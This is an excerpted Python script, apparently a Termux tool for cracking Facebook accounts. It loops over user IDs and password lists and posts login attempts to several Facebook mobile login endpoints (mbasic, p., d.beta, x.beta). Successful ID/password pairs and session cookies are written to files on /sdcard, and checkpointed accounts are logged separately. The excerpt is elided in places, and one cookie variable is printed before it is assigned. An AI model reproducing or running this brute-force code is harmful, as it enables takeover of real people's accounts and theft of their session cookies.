...
os.system('HI TOOL ID "')
time.sleep(2)
os.system(f'xdg-open https://t.me/b72_i')
logo=("""
...
def menu():
        ...
        try:
                ...
                if "server on" in sj:
                        #clear()
                        os.system('espeak -a 300 " Welcome,   to,  The,   Menu ID"')
                        ...
                        if xd in ['1','01']:
                                ...
                                clear()
                                linex()
                                print('\x1b[1;93m 1. \x1b[1;92mMETHODE IRAQ')
                                linex()
                                mthd=input('\x1b[1;97m Choose: ')
                                plist = []
                                clear()
                                linex()
                                print('\x1b[1;93m 1. \x1b[1;92mALL PASS \n \x1b[1;93m2. \x1b[1;92mCHOICE PASS ')
                                linex()
                                ppp=input(' Choose: ')
                                if ppp in ['1','01']:
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;37m [\033[1;36mID ➪\033[1;37m] \033[1;37m[\033[1;31m%s\033[1;37m] \033[1;37m[\033[1;32mOK\033[1;30m:-\033[1;32m%s\033[1;37m] \033[1;37m[\033[1;33m%s%%\033[1;37m]\033[1;34m'%(loop,len(oks),p));sys.stdout.flush()
    ...
    'viewport-width': '980',
                        ...
                        getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&resrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        ASX=str(session.cookies)
                        if "c_user" in ASX:
                                print('\33[1;92m[HALO-OK] '+ids+' | '+pas+'\33[0;97m')
                                print("\033[1;92m[•] Cookie: "+coki)
                                os.system('espeak -a 300 " HALO,  OK,    ,ID   PASSWORD"')
                                dc=dict(session.cookies)
                                coki=";".join([k+"="+v for k,v in dc.items()])
                                open('/sdcard/ID ➪COOKIE.txt','a').write(coki+'\n')
                                open('/sdcard/ID ➪OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in ASX:
                                if 'y' in pcp:
                                        print('\33[1;93m[ID ➪-CP] '+ids+' | '+pas+'\33[0;97m')
...
def api(ids,names,passlist):
    ...
    'viewport-width': '980',
                        ...
                        getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&resrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        ASX=str(session.cookies)
                        if "c_user" in ASX:
                                print('\33[1;92m[ID ➪OK] '+ids+' | '+pas+'\33[0;97m')
                                print("\033[1;92m[•] Cookie: "+coki)
                                os.system('espeak -a 300 " ID ➪,  OK,    ,ID   PASSWORD"')
                                dc=dict(session.cookies)
                                coki=";".join([k+"="+v for k,v in dc.items()])
                                open('/sdcard/ID ➪COOKIE.txt','a').write(coki+'\n')
                                open('/sdcard/ID ➪OK.txt', 'a').write(ids+'|'+pas+'\n')
...
def api2(ids,names,passlist):
    ...
    'viewport-width': '980',
                        ...
                        getlog = session.get(f'https://d.beta.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&resrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://d.beta.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post('https://d.beta.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        ASX=str(session.cookies)
                        if "c_user" in ASX:
                                print('\33[1;92m[ID ➪OK] '+ids+' | '+pas+'\33[0;97m')
                                print("\033[1;92m[•] Cookie: "+coki)
...
def api3(ids,names,passlist):
    ...
    'viewport-width': '980',
                        ...
                        getlog = session.get(f'https://x.beta.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&resrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://x.beta.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post('https://x.beta.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        ASX=str(session.cookies)
                        if "c_user" in ASX:
                                print('\33[1;92m[ID ➪OK] '+ids+' | '+pas+'\33[0;97m')
                                print("\033[1;92m[•] Cookie: "+coki)
    ...
    "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [ID ➪-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        os.system('espeak -a 300 " ID ➪,  OK,    ,ID   PASSWORD"')
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [ID ➪CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ID ➪CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
